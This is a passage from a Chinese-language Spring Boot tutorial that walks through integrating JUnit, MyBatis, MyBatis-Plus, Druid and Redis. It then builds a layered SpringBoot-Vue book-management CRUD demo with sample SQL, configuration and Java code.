SpringbootJunitApplication.class)\nclass SpringbootJunitApplicationTests {\n    //注入你要测试的对象\n    @Autowired\n    private BookDao bookDao;\n    @Test\n    void contextLoads() {\n        //执行要测试的对象对应的方法\n        bookDao.save();\n        System.out.println(\"two...\");\n    }\n}\n```\n\n第二种方式回归原始配置方式，仍然使用 @ContextConfiguration 注解进行，效果是一样的\n\n```java\n@SpringBootTest\n@ContextConfiguration(classes = SpringbootJunitApplication.class)\nclass SpringbootJunitApplicationTests {\n    //注入你要测试的对象\n    @Autowired\n    private BookDao bookDao;\n    @Test\n    void contextLoads() {\n        //执行要测试的对象对应的方法\n        bookDao.save();\n        System.out.println(\"two...\");\n    }\n}\n```\n\n**总结**\n\n1. 导入测试对应的starter\n2. 测试类使用@SpringBootTest修饰\n3. 使用自动装配的形式添加要测试的对象\n4. 测试类如果存在于引导类所在包或子包中无需指定引导类\n5. 测试类如果不存在于引导类所在的包或子包中需要通过classes属性指定引导类\n\n## 2.整合MyBatis\n\n**步骤①**：创建模块时勾选要使用的技术，MyBatis，由于要操作数据库，还要勾选对应数据库\n\n![](https://img.jwt1399.top/img/202209071920462.png)\n\n或者手工导入 MyBatis 的 starter 和对应数据库的坐标\n\n```xml\n<dependency>\n    <groupId>org.mybatis.spring.boot</groupId>\n    <artifactId>mybatis-spring-boot-starter</artifactId>\n    <version>2.2.2</version>\n</dependency>\n\n<dependency>\n  <groupId>mysql</groupId>\n  <artifactId>mysql-connector-java</artifactId>\n  <scope>runtime</scope>\n</dependency>\n```\n\n**步骤②**：配置数据源相关信息，没有这个信息你连接哪个数据库都不知道\n\n```yaml\nspring:\n  datasource:\n    driver-class-name: com.mysql.cj.jdbc.Driver\n    url: jdbc:mysql://localhost:3306/ssm_db?serverTimezone=Asia/Shanghai\n    username: root\n    password: root\n```\n\n**测试**\n\n- 测试表\n\n```sql\nSET NAMES utf8;\nSET FOREIGN_KEY_CHECKS = 0;\n\n-- ----------------------------\n-- Table structure for tbl_book\n-- ----------------------------\nDROP TABLE IF EXISTS `tbl_book`;\nCREATE TABLE `tbl_book`  (\n  `id` int NOT NULL AUTO_INCREMENT,\n  `name` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `type` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `description` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  PRIMARY KEY (`id`) USING BTREE\n) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;\n\n-- ----------------------------\n-- Records of tbl_book\n-- ----------------------------\nINSERT INTO `tbl_book` VALUES (1, '三体', '科幻', '大刘的巅峰之作，将中国科幻推向世界舞台。总共分为三部曲：《地球往事》、《黑暗森林》、《死神永生》。');\nINSERT INTO `tbl_book` VALUES (2, '格林童话', '童话', '睡前故事。');\nINSERT INTO `tbl_book` VALUES (3, 'Spring 5设计模式', '计算机理论', '深入Spring源码剖析Spring源码中蕴含的10大设计模式');\nINSERT INTO `tbl_book` VALUES (4, 'Spring MVC+ MyBatis开发从入门到项目实战', '计算机理论', '全方位解析面向Web应用的轻量级框架,带你成为Spring MVC开发高手');\nINSERT INTO `tbl_book` VALUES (5, '轻量级Java Web企业应用实战', '计算机理论', '源码级剖析Spring框架,适合已掌握Java基础的读者');\nINSERT INTO `tbl_book` VALUES (6, 'Java核心技术卷|基础知识(原书第11版)', '计算机理论', 'Core Java第11版，Jolt大奖获奖作品，针对Java SE9、10、 11全面更新');\nINSERT INTO `tbl_book` VALUES (7, '深入理解Java虚拟机', '计算机理论', '5个维度全面剖析JVM,面试知识点全覆盖');\nINSERT INTO `tbl_book` VALUES (8, 'Java编程思想(第4版)', '计算机理论', 'Java学习必读经典殿堂级著作!赢得了全球程序员的广泛赞誉');\nINSERT INTO `tbl_book` VALUES (9, '零基础学Java (全彩版)', '计算机理论', '零基础自学编程的入门]图书，由浅入深，详解Java语言的编程思想和核心技术');\nINSERT INTO `tbl_book` VALUES (10, '直播就该这么做:主播高效沟通实战指南', '市场营销', '李子柒、李佳琦、薇娅成长为网红的秘密都在书中');\nINSERT INTO `tbl_book` VALUES (11, '直播销讲实战一本通', '市场营销', '和秋叶一起学系列网络营销书籍');\nINSERT INTO `tbl_book` VALUES (12, '直播带货:淘宝、天猫直播从新手到高手', '市场营销', '一本教你如何玩转直播的书， 10堂课轻松实现带货月入3W+');\nINSERT INTO `tbl_book` VALUES (13, 'Spring实战第5版', '计算机理论', 'Spring入门经典教程,深入理解Spring原理技术内幕');\nINSERT INTO `tbl_book` VALUES (14, 'Spring 5核心原理与30个类手写实战', '计算机理论', '十年沉淀之作，写Spring精华思想');\n\nSET FOREIGN_KEY_CHECKS = 1;\n```\n\n- 实体类\n\n```java\npublic class Book {\n    private Integer id;\n    private String type;\n    private String name;\n    private String description;\n}\n```\n\n- 映射接口（Dao）\n\n```java\n@Mapper\npublic interface BookDao {\n    @Select(\"select * from tbl_book where id = #{id}\")\n    public Book getById(Integer id);\n}\n```\n\n- 测试类\n\n```java\n@SpringBootTest\nclass Springboot05MybatisApplicationTests {\n    @Autowired\n    private BookDao bookDao;\n    @Test\n    void contextLoads() {\n        System.out.println(bookDao.getById(1));\n    }\n}\n```\n\n**总结**\n\n1. 整合操作需要勾选MyBatis技术，也就是导入MyBatis对应的starter\n\n2. 数据库连接相关信息转换成配置\n\n3. 数据库SQL映射需要添加@Mapper被容器识别到\n\n4. MySQL 8.X驱动强制要求设置时区\n\n   - 修改url，添加serverTimezone设定\n   - 修改MySQL数据库配置：修改mysql中的配置文件mysql.ini，在mysqld项中添加default-time-zone=+8:00\n\n5. 驱动类过时，提醒更换为com.mysql.cj.jdbc.Driver\n\n## 3.整合MyBatis-Plus\n\n**步骤①**：导入对应的 starter 和数据库驱动\n\n```xml\n<dependency>\n    <groupId>com.baomidou</groupId>\n    <artifactId>mybatis-plus-boot-starter</artifactId>\n    <version>3.4.3</version>\n</dependency>\n\n<dependency>\n  <groupId>mysql</groupId>\n  <artifactId>mysql-connector-java</artifactId>\n  <scope>runtime</scope>\n</dependency>\n```\n\n**步骤②**：配置数据源相关信息\n\n```yaml\nspring:\n  datasource:\n    driver-class-name: com.mysql.cj.jdbc.Driver\n    url: jdbc:mysql://localhost:3306/ssm_db\n    username: root\n    password: root\n```\n\n**步骤③**：配置表名的通用前缀名\n\n数据库的表名定义规则是tbl_模块名称，为了能和实体类相对应，需要设置所有表名的通用前缀名\n\n```yaml\nmybatis-plus:\n  global-config:\n    db-config:\n      table-prefix: tbl_\t\t#设置所有表的通用前缀名称为tbl_\n```\n\n**步骤④**：配置运行日志\n\n使用MP后开发者不需要书写SQL语句了，这样程序运行的时候总有一种感觉，一切的一切都是黑盒的，作为开发者我们啥也不知道就完了。如果程序正常运行还好，如果报错了，这个时候就很崩溃，你甚至都不知道从何下手，因为传递参数、封装SQL语句这些操作完全不是你干预开发出来的，所以查看执行期运行的SQL语句就成为当务之急。SpringBoot整合MP的时候充分考虑到了这点，通过配置的形式就可以查阅执行期SQL语句，配置如下\n\n```yaml\nmybatis-plus:\n  global-config:\n    db-config:\n      table-prefix: tbl_\n      id-type: auto\n  configuration:\n    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl #配置日志\n```\n\n**测试**\n\n- 实体类\n\n```java\npublic class Book {\n    private Integer id;\n    private String type;\n    private String name;\n    private String description;\n}\n```\n\n- 映射接口（Dao）\n\n```java\n@Mapper\npublic interface BookDao extends BaseMapper<Book> {\n}\n```\n\n核心在于Dao接口继承了一个BaseMapper的接口，这个接口中帮助开发者预定了若干个常用的API接口，简化了通用API接口的开发工作。\n\n- 测试类\n\n```java\n@SpringBootTest\nclass SpringbootApplicationTests {\n    @Autowired\n    private BookDao bookDao;\n    @Test\n    void contextLoads() {\n        System.out.println(bookDao.selectById(2));\n        System.out.println(bookDao.selectList(null));\n    }\n}\n```\n\n**总结**\n\n1. 手工添加MyBatis-Plus对应的starter\n2. 数据层接口使用BaseMapper简化开发\n3. 借助MyBatis-Plus日志可以查阅执行SQL语句\n4. 需要使用的第三方技术无法通过勾选确定时，需要手工添加坐标\n\n## 4.整合Durid\n\n前面整合 MyBatis 和 MyBatis-Plus 的时候，使用的数据源对象都是SpringBoot默认的数据源对象 HiKari，下面我们手工控制一下，自己指定了一个数据源对象 Druid。\n\n**步骤①**：导入对应的starter\n\n```xml\n<dependencies>\n    <dependency>\n        <groupId>com.alibaba</groupId>\n        <artifactId>druid-spring-boot-starter</artifactId>\n        <version>1.2.6</version>\n    </dependency>\n</dependencies>\n```\n\n**步骤②**：修改配置\n\n```yaml\nspring:\n  datasource:\n    druid:\n      driver-class-name: com.mysql.cj.jdbc.Driver\n      url: jdbc:mysql://localhost:3306/ssm_db?serverTimezone=UTC\n      username: root\n      password: root\n      \n#除了这4个常规配置外，还有druid专用的其他配置。通过提示功能可以打开druid相关的配置查阅\n```\n\n**总结**\n\n1. 整合Druid需要导入Druid对应的starter\n2. 根据Druid提供的配置方式进行配置\n\n## 5.整合Redis\n\n**步骤①**：导入对应的starter 和依赖\n\n```xml\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-data-redis</artifactId>\n</dependency>\n\n<!--连接池依赖-->\n<dependency>\n  <groupId>org.apache.commons</groupId>\n  <artifactId>commons-pool2</artifactId>\n  <version>2.6.0</version>\n</dependency>\n```\n\n**步骤②**：修改配置\n\n```yaml\nspring:\n  redis:\n    host: 127.0.0.1 #指定redis所在的host\n    port: 6379  #指定redis的端口\n    password: 123456  #设置redis密码\n    lettuce:\n      pool:\n        max-active: 8 #最大连接数\n        max-idle: 8 #最大空闲数\n        min-idle: 0 #最小空闲数\n        max-wait: 100ms #连接等待时间\n```\n\n**测试**\n\n```java\n@SpringBootTest\nclass SpringRedisApplicationTests {\n    @Resource\n    private RedisTemplate redisTemplate;\n    @Test\n    void testString() {\n        // 1.通过RedisTemplate获取操作String类型的ValueOperations对象\n        ValueOperations ops = redisTemplate.opsForValue();\n        // 2.插入一条数据\n        ops.set(\"name\",\"jianjian\");\n        // 3.获取数据\n        String name = (String) ops.get(\"name\");\n        System.out.println(\"name = \" + name);\n    }\n}\n```\n\n# 五、整合案例\n\n> 本章将实现一个基于 SpringBoot -Vue 的 CRUD 整合 Demo\n>\n> 项目地址：https://github.com/jwt1399/SpringBoot-Vue-CRUD\n\n## 0.项目简介\n\n### ①.项目层次\n\n- **entity层**\n\nentity层即数据库实体层，也称为 POJO 层（Plain Ordinary Java Object，即简单普通的java对象）或 model 层。 entity层的作用为存放实体类Bean。 一般数据库一张表对应一个实体类，类属性同表字段一一对应。\n\n- **dao层**\n\ndao层即数据持久层，也称为mapper层。 dao层的作用为访问数据库，向数据库发送sql语句，完成数据的增删改查任务。\n\n- **service层**\n\nservice层即业务逻辑层。  service层的作用为完成功能设计。  service层调用dao层接口，接收dao层返回的数据，完成项目的基本功能设计。\n\n- **controller层**\n\ncontroller层即控制层。  controller层的功能为请求和响应控制。  controller层负责前后端交互，接受前端请求，调用service层，接收service层返回的数据，最后返回具体的页面和数据到客户端。\n\n![](https://img.jwt1399.top/img/202209082324008)\n\n### ②.相关技术\n\n- Bean开发————使用`Lombok`快速制作实体类\n- Dao开发————整合`MyBatis-Plus`，制作数据层测试\n- Service开发————基于`MyBatis-Plus`进行增量开发，制作业务层测试类\n- Controller开发————基于`Restful`开发，使用`PostMan`测试接口功能\n- 页面开发————基于`VUE+ElementUI`制作，前后端联调，页面数据处理，页面消息处理\n\n### ③.项目展示\n\n#### 主页面\n\n![](https://img.jwt1399.top/img/202209080000584.png)\n\n#### 增/改\n\n![](https://img.jwt1399.top/img/202209080001120.png)\n\n#### 删除\n\n![](https://img.jwt1399.top/img/202209080001905.png)\n\n#### 查询\n\n![](https://img.jwt1399.top/img/202209080001485.png)\n\n## 1.项目创建\n\n创建新项目，加载要使用的技术对应的starter，修改配置文件格式为yml格式，并把web访问端口先设置成80。\n\n**pom.xml**\n\n```xml\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-web</artifactId>\n</dependency>\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-test</artifactId>\n  <scope>test</scope>\n</dependency>\n\n```\n\n**application.yml**\n\n```yaml\nserver:\n  port: 80\n```\n\n## 2.实体层开发\n\n**数据表**\n\n```sql\n-- ----------------------------\n-- Table structure for tbl_book\n-- ----------------------------\nDROP TABLE IF EXISTS `tbl_book`;\nCREATE TABLE `tbl_book`  (\n  `id` int(11) NOT NULL AUTO_INCREMENT,\n  `type` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `name` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  PRIMARY KEY (`id`) USING BTREE\n) ENGINE = InnoDB AUTO_INCREMENT = 51 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;\n\n-- ----------------------------\n-- Records of tbl_book\n-- ----------------------------\nINSERT INTO `tbl_book` VALUES (1, '计算机理论', 'Spring实战 第5版', 'Spring入门经典教程，深入理解Spring原理技术内幕');\nINSERT INTO `tbl_book` VALUES (2, '计算机理论', 'Spring 5核心原理与30个类手写实战', '十年沉淀之作，手写Spring精华思想');\nINSERT INTO `tbl_book` VALUES (3, '计算机理论', 'Spring 5 设计模式', '深入Spring源码剖析Spring源码中蕴含的10大设计模式');\nINSERT INTO `tbl_book` VALUES (4, '计算机理论', 'Spring MVC+MyBatis开发从入门到项目实战', '全方位解析面向Web应用的轻量级框架，带你成为Spring MVC开发高手');\nINSERT INTO `tbl_book` VALUES (5, '计算机理论', '轻量级Java Web企业应用实战', '源码级剖析Spring框架，适合已掌握Java基础的读者');\nINSERT INTO `tbl_book` VALUES (6, '计算机理论', 'Java核心技术 卷I 基础知识（原书第11版）', 'Core Java 第11版，Jolt大奖获奖作品，针对Java SE9、10、11全面更新');\nINSERT INTO `tbl_book` VALUES (7, '计算机理论', '深入理解Java虚拟机', '5个维度全面剖析JVM，大厂面试知识点全覆盖');\nINSERT INTO `tbl_book` VALUES (8, '计算机理论', 'Java编程思想（第4版）', 'Java学习必读经典,殿堂级著作！赢得了全球程序员的广泛赞誉');\nINSERT INTO `tbl_book` VALUES (9, '计算机理论', '零基础学Java（全彩版）', '零基础自学编程的入门图书，由浅入深，详解Java语言的编程思想和核心技术');\nINSERT INTO `tbl_book` VALUES (10, '市场营销', '直播就该这么做：主播高效沟通实战指南', '李子柒、李佳琦、薇娅成长为网红的秘密都在书中');\nINSERT INTO `tbl_book` VALUES (11, '市场营销', '直播销讲实战一本通', '和秋叶一起学系列网络营销书籍');\nINSERT INTO `tbl_book` VALUES (12, '市场营销', '直播带货：淘宝、天猫直播从新手到高手', '一本教你如何玩转直播的书，10堂课轻松实现带货月入3W+');\n```\n\n**实体类**\n\n```java\npublic class Book {\n    private Integer id;\n    private String type;\n    private String name;\n    private String description;\n}\n```\n\n实体类的开发可以手工生成get/set方法，然后覆盖toString()方法。不过这一套操作书写很繁琐，可以使用 `Lombok`简化JavaBean开发。\n\n引入 Lombok，用注解代替构造器、getter/setter、toString()等代码，新版 IDEA 已集成 Lombok 插件，无需下载\n\n```xml\n<dependency>\n  <groupId>org.projectlombok</groupId>\n  <artifactId>lombok</artifactId>\n</dependency>\n```\n\n- @Data ： 注在类上，提供类的get、set、equals、hashCode、toString等方法\n\n- @AllArgsConstructor ：注在类上，提供类的全参构造\n\n- @NoArgsConstructor ：注在类上，提供类的无参构造\n\n- @Setter ：注在属性上，提供 set 方法\n\n- @Getter ：注在属性上，提供 get 方法\n\n- @EqualsAndHashCode ：注在类上，提供对应的 equals 和 hashCode 方法\n\n- @Log4j/@Slf4j ：注在类上，提供对应的 Logger 对象，变量名为 log\n\n```java\n//简化JavaBean开发\n@NoArgsConstructor //无参构造\n@AllArgsConstructor //有参构造\n@Data\npublic class Book {\n    private Integer id;\n    private String type;\n    private String name;\n    private String description;\n}\n```\n\nLombok 还可以简化日志开发，例如下面代码\n\n```java\n@Slf4j\n@RestController\npublic class HelloController {\n    @RequestMapping(\"/hello\")\n    public String handle(@RequestParam(\"name\") String name){\n        log.info(\"请求进来了....\");\n        return \"Hello, Spring Boot 2!\"+\"你好：\"+name;\n    }\n}\n```\n\n## 3.数据层开发\n\n### ①基础CRUD\n\n**步骤①**：导入MyBatisPlus与Druid对应的starter，当然mysql的驱动不能少\n\n```xml\n<dependency>\n  <groupId>com.baomidou</groupId>\n  <artifactId>mybatis-plus-boot-starter</artifactId>\n  <version>3.4.3</version>\n</dependency>\n<dependency>\n  <groupId>com.alibaba</groupId>\n  <artifactId>druid-spring-boot-starter</artifactId>\n  <version>1.2.6</version>\n</dependency>\n<dependency>\n  <groupId>mysql</groupId>\n  <artifactId>mysql-connector-java</artifactId>\n  <scope>runtime</scope>\n</dependency>\n```\n\n**步骤②**：配置数据库连接相关的数据源配置\n\n```yaml\nspring:\n  datasource:\n    druid:\n      driver-class-name: com.mysql.cj.jdbc.Driver\n      url: jdbc:mysql://localhost:3306/ssm_db?serverTimezone=Asia/Shanghai\n      username: root\n      password: root\n```\n\n**步骤③**：配置MP相关配置\n\n- 表名通用前缀\n- 主键生成策略\n  - MP技术默认的主键生成策略为雪花算法，生成的主键ID长度较大，和目前的数据库设定规则不相符，需要配置一下使MP使用数据库的主键生成策略\n- 配置MP日志\n  - 设置日志输出方式为标准输出即可查阅SQL执行日志\n\n```yaml\nmybatis-plus:\n  global-config:\n    db-config:\n      table-prefix: tbl_\t\t#设置表名通用前缀\n      id-type: auto\t\t\t\t#设置主键id字段的生成策略为参照数据库设定的策略，当前数据库设置id生成策略为自增\n  configuration:\n    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl  #配置标准输出日志\n```\n\n**步骤④**：使用MP的标准通用接口BaseMapper加速开发，别忘了@Mapper和泛型的指定\n\n```java\n@Mapper\npublic interface BookDao extends BaseMapper<Book> {\n}\n```\n\n**步骤⑤**：制作测试类测试结果\n\n```java\npackage com.jianjian.dao;\n\n@SpringBootTest\npublic class BookDaoTests {\n\n    @Autowired\n    private BookDao bookDao;\n\n    @Test\n    void testGetById(){\n        System.out.println(bookDao.selectById(1));\n    }\n\n    @Test\n    void testSave(){\n        Book book = new Book();\n        book.setType(\"测试数据123\");\n        book.setName(\"测试数据123\");\n        book.setDescription(\"测试数据123\");\n        bookDao.insert(book);\n    }\n\n    @Test\n    void testUpdate(){\n        Book book = new Book();\n        book.setId(17);\n        book.setType(\"测试数据abcdefg\");\n        book.setName(\"测试数据123\");\n        book.setDescription(\"测试数据123\");\n        bookDao.updateById(book);\n    }\n\n    @Test\n    void testDelete(){\n        bookDao.deleteById(16);\n    }\n\n    @Test\n    void testGetAll(){\n        bookDao.selectList(null);\n    }\n}\n```\n\n**总结**\n\n1. 手工导入starter坐标（2个），mysql驱动（1个）\n2. 配置数据源与MyBatisPlus对应的配置\n3. 配置MP相关配置\n4. 开发Dao接口（继承BaseMapper）\n5. 制作测试类测试Dao功能是否有效\n\n### ②分页功能\n\nMyBatis-Plus自带分页插件，只要需要**定义MP拦截器并将其设置为Spring管控的bean**即可实现分页功能\n\n```java\n@Configuration\npublic class MPConfig {\n    @Bean\n    public MybatisPlusInterceptor mybatisPlusInterceptor(){\n        //创建MP的拦截器栈\n        MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor();\n        //初始化了分页拦截器，并添加到拦截器栈中\n        //如果后期开发其他功能，需要添加全新的拦截器，按照此行的格式继续add进去新的拦截器就可以了。\n        interceptor.addInnerInterceptor(new PaginationInnerInterceptor());\n        return interceptor;\n    }\n}\n```\n\nMP提供的分页操作API如下\n\n```java\n@Test\nvoid testGetPage(){\n    IPage page = new Page(2,5);\n    bookDao.selectPage(page, null);\n    System.out.println(page.getCurrent());\t\t  //当前页码值\n    System.out.println(page.getSize());\t\t\t   //每页显示数\n    System.out.println(page.getTotal());\t\t  //数据总量\n    System.out.println(page.getPages());\t\t //总页数\n    System.out.println(page.getRecords());\t//详细数据\n}\n```\n\n其中`selectPage`方法需要传入一个封装分页数据的`IPage`对象，可以通过new的形式创建这个对象。创建此对象时就需要指定分页的两个基本数据\n\n- 当前显示第几页\n- 每页显示几条数据\n\n可以通过创建Page对象时利用构造方法初始化这两个数据\n\n```java\nIPage page = new Page(2,5);\n```\n\n将该对象传入到查询方法selectPage后，可以得到查询结果，但是我们会发现当前操作查询结果返回值仍然是一个IPage对象，这又是怎么回事？\n\n```java\nIPage page = bookDao.selectPage(page, null);\n```\n\n原来这个IPage对象中封装了若干个数据，而查询的结果作为IPage对象封装的一个数据存在的，可以理解为查询结果得到后，又塞到了这个IPage对象中，其实还是为了高度的封装。\n\n**总结**\n\n1. 分页操作依赖MyBatisPlus分页拦截器实现功能\n2. 使用IPage封装分页数据\n\n### ③条件查询\n\n以往我们写条件查询要自己动态拼写复杂的SQL语句，现在简单了，MP将这些操作都制作成API接口，调用一个又一个的方法就可以实现各种套件的拼装。\n\n下面的操作就是执行一个模糊匹配对应的操作，由like条件书写变为了like方法的调用\n\n```java\n@Test\nvoid testGetBy(){\n    //封装查询条件的对象\n    QueryWrapper<Book> qw = new QueryWrapper<>();\n    //查询条件\n    qw.like(\"name\",\"Spring\");\n    bookDao.selectList(qw);\n}\n```\n\n由于属性字段名的书写存在着安全隐患，比如查询字段name，当前是以字符串的形态书写的，万一写错，编译器还没有办法发现，只能将问题抛到运行器通过异常堆栈告诉开发者，不太友好。\n\nMP针对字段检查进行了功能升级，全面支持Lambda表达式。由QueryWrapper对象升级为LambdaQueryWrapper对象，这下就解决了上述问题的出现\n\n```java\n@Test\nvoid testGetBy2(){\n    String name = \"1\";\n    LambdaQueryWrapper<Book> lqw = new LambdaQueryWrapper<Book>();\n    lqw.like(Book::getName,\"Spring\");\n    bookDao.selectList(lqw);\n}\n```\n\n为了便于开发者动态拼写SQL，防止将null数据作为条件使用，MP还提供了动态拼装SQL的快捷书写方式\n\n```java\n    @Test\n    void testGetBy3(){\n        String name = \"Spring\";\n        LambdaQueryWrapper<Book> lqw = new LambdaQueryWrapper<Book>();\n        //if(name != null) lqw.like(Book::getName,name);\t\t//方式一：JAVA代码控制\n        lqw.like(name != null,Book::getName,name);\t\t\t\t //方式二：API接口提供控制开关\n        bookDao.selectList(lqw);\n    }\n```\n\n**总结**\n\n1. 使用QueryWrapper对象封装查询条件\n\n2. **推荐**使用LambdaQueryWrapper对象\n\n3. 所有查询操作封装成方法调用\n\n4. 查询条件支持动态条件拼装\n\n## 4.业务层开发\n\n### ①简介\n\n初学者认为业务层就是调用数据层，更精准的说法应该是<font color=\"#ff0000\"><b>组织业务逻辑功能，并根据业务需求，对数据持久层发起调用</b></font>。\n\n一个常识性的知识普及一下，业务层的方法名定义一定要与业务有关，例如登录操作\n\n```java\nlogin(String username,String password);\n```\n\n而数据层的方法名定义一定与业务无关，是一定，不是可能，也不是有可能，例如根据用户名密码查询\n\n```java\nselectByUserNameAndPassword(String username,String password);\n```\n\n我们在开发的时候是可以根据完成的工作不同划分成不同职能的开发团队的。\n\n比如开发数据层的团队，拿到的需求文档要求可能是这样的\n\n```\n接口：传入用户名与密码字段，查询出对应结果，结果是单条数据\n接口：传入ID字段，查询出对应结果，结果是单条数据\n接口：传入离职字段，查询出对应结果，结果是多条数据\n```\n\n但是开发业务层功能团队，拿到的需求文档要求差别就很大\n\n```\n接口：传入用户名与密码字段，对用户名字段做长度校验，4-15位，对密码字段做长度校验，8到24位，对喵喵喵字段做特殊字符校验，不允许存在空格，查询结果为对象。如果为null，返回BusinessException，封装消息码INFO_LOGON_USERNAME_PASSWORD_ERROR\n```\n\n所以说业务层方法定义与数据层方法定义差异化很大\n\n### ②普通开发\n\n**步骤①**：业务层接口定义如下：\n\n```java\npublic interface BookService {\n    Boolean save(Book book);\n    Boolean update(Book book);\n    Boolean delete(Integer id);\n    Book getById(Integer id);\n    List<Book> getAll();\n    IPage<Book> getPage(int currentPage,int pageSize);\n}\n```\n\n**步骤②**：业务层实现类如下，转调数据层即可\n\n```java\n@Service\npublic class BookServiceImpl implements BookService {\n\n    @Autowired\n    private BookDao bookDao;\n\n    @Override\n    public Boolean save(Book book) {\n        return bookDao.insert(book) > 0;\n    }\n\n    @Override\n    public Boolean update(Book book) {\n        return bookDao.updateById(book) > 0;\n    }\n\n    @Override\n    public Boolean delete(Integer id) {\n        return bookDao.deleteById(id) > 0;\n    }\n\n    @Override\n    public Book getById(Integer id) {\n        return bookDao.selectById(id);\n    }\n\n    @Override\n    public List<Book> getAll() {\n        return bookDao.selectList(null);\n    }\n\n    @Override\n    public IPage<Book> getPage(int currentPage, int pageSize) {\n        IPage page = new Page(currentPage,pageSize);\n        return bookDao.selectPage(page,null);\n    }\n}\n```\n\n​\t**步骤③**：对业务层接口进行测试\n\n```java\n@SpringBootTest\npublic class BookServiceTests {\n    @Autowired\n    private BookService bookService;\n\n    @Test\n    void testGetById(){\n        System.out.println(bookService.getById(4));\n    }\n    @Test\n    void testSave(){\n        Book book = new Book();\n        book.setType(\"测试数据123\");\n        book.setName(\"测试数据123\");\n        book.setDescription(\"测试数据123\");\n        bookService.save(book);\n    }\n    @Test\n    void testUpdate(){\n        Book book = new Book();\n        book.setId(17);\n        book.setType(\"-----------------\");\n        book.setName(\"测试数据123\");\n        book.setDescription(\"测试数据123\");\n        bookService.update(book);\n    }\n    @Test\n    void testDelete(){\n        bookService.delete(18);\n    }\n    @Test\n    void testGetAll(){\n        bookService.getAll();\n    }\n    @Test\n    void testGetPage(){\n        IPage<Book> page = bookService.getPage(2, 5);\n        System.out.println(page.getCurrent());\n        System.out.println(page.getSize());\n        System.out.println(page.getTotal());\n        System.out.println(page.getPages());\n        System.out.println(page.getRecords());\n    }\n}\n```\n\n**总结**\n\n1. Service接口名称定义成业务名称，并与Dao接口名称进行区分\n2. 制作测试类测试Service功能是否有效\n\n### ③快速开发\n\nMP不仅提供了数据层快速开发方案，MP也给了业务层一个通用接口，**不推荐使用**，其实就是一个封装+继承的思想，实际开发慎用\n\n**步骤①**：业务层接口快速开发\n\n```java\npublic interface IBookService extends IService<Book> {\n    //添加非通用操作API接口\n}\n```\n\n**步骤②**：业务层接口实现类快速开发，继承的类需要传入两个泛型，一个是数据层接口，另一个是实体类\n\n```java\n@Service\npublic class BookServiceImpl extends ServiceImpl<BookDao, Book> implements IBookService {\n    @Autowired\n    private BookDao bookDao;\n\t//添加非通用操作API\n}\n```\n\n如果感觉MP提供的功能不足以支撑你的使用需要，可以在原始接口基础上接着定义新的API接口就行了\n\n**总结**\n\n1. 使用通用接口（ISerivce\\<T>）快速开发Service\n2. 使用通用实现类（ServiceImpl<M,T>）快速开发ServiceImpl\n3. 可以在通用接口基础上做功能重载或功能追加\n4. 注意重载时不要覆盖原始操作，避免原始提供的功能丢失\n\n## 5.控制层开发\n\n### ①普通Restful开发\n\n**步骤①**：控制层接口如下，基于Restful开发\n\n```java\n@RestController\n@RequestMapping(\"/books\")\npublic class BookController {\n\n    @Autowired\n    private BookService bookService;\n\n    @GetMapping\n    public List<Book> getAll(){\n        return bookService.list();\n    }\n\n    @PostMapping\n    public Boolean save(@RequestBody Book book){\n        return bookService.save(book);\n    }\n\n    @PutMapping\n    public Boolean update(@RequestBody Book book){\n        return bookService.modify(book);\n    }\n\n    @DeleteMapping(\"{id}\")\n    public Boolean delete(@PathVariable Integer id){\n        return bookService.delete(id);\n    }\n\n    @GetMapping(\"{id}\")\n    public Book getById(@PathVariable Integer id){\n        return bookService.getById(id);\n    }\n\n    @GetMapping(\"{currentPage}/{pageSize}\")\n    public IPage<Book> getPage(@PathVariable int currentPage,@PathVariable int pageSize){\n        return bookService.getPage(currentPage,pageSize, null);\n    }\n}\n```\n\n**步骤②**：Postman测试，关注提交类型，对应上即可，不然就会报405的错误码了\n\n- **普通GET请求**\n\n![](https://img.jwt1399.top/img/202209100004375.png)\n\n- **GET请求传递路径变量，后台使用@PathVariable接收数据**\n\n![](https://img.jwt1399.top/img/202209100004293.png)\n\n- **PUT请求传递json数据，后台使用@RequestBody接收数据**\n\n![](https://img.jwt1399.top/img/202209100014797.png)\n\n**总结**\n\n1. 基于Restful制作表现层接口\n   - 新增：@PostMapping\n   - 删除：@DeleteMapping\n   - 修改：@PutMapping\n   - 查询：@GetMapping\n2. 接收参数\n   - 实体数据：@RequestBody\n   - 路径变量：@PathVariable\n\n### ②消息一致性开发\n\n> 为何要返回统一格式。为方便使用已封装好，导入项目即可使用：https://jwt1399.lanzouv.com/iINu80bfh1sd\n\n现在大多数web项目基本都是前后端分离模式，这种模式会涉及到一个前后端对接问题，所以一套完善且规范的接口是非常有必要的，不仅能够提高对接效率，也可以让我的代码看起来更加简洁优雅。本节将解决如何返回统一的标准格式以及处理全局异常。\n\n如果SpringBoot不使用统一返回格式，默认会有如下三种返回情况。\n\n- 返回字符串\n\n```java\n@GetMapping(\"/getUserName\")\npublic String getUserName(){\n    return \"Hello\";\n}\n\n// 返回结果：Hello\n```\n\n- 返回实体类对象\n\n```java\n@GetMapping(\"/getUserName\")\npublic User getUserName(){\n    return new User(\"Hello\",18);\n}\n\n// 返回结果：\n{\n  \"name\": \"Hello\",\n  \"age\": \"18\"\n}\n```\n\n- 返回异常\n\n```java\n@GetMapping(\"/getUserName\")\npublic static String getUserName(){\n    HashMap hashMap = new HashMap();\n    return hashMap.get(0).toString(); // 模拟一个空指针异常\n}\n\n// 返回结果：\n{\n    \"timestamp\": 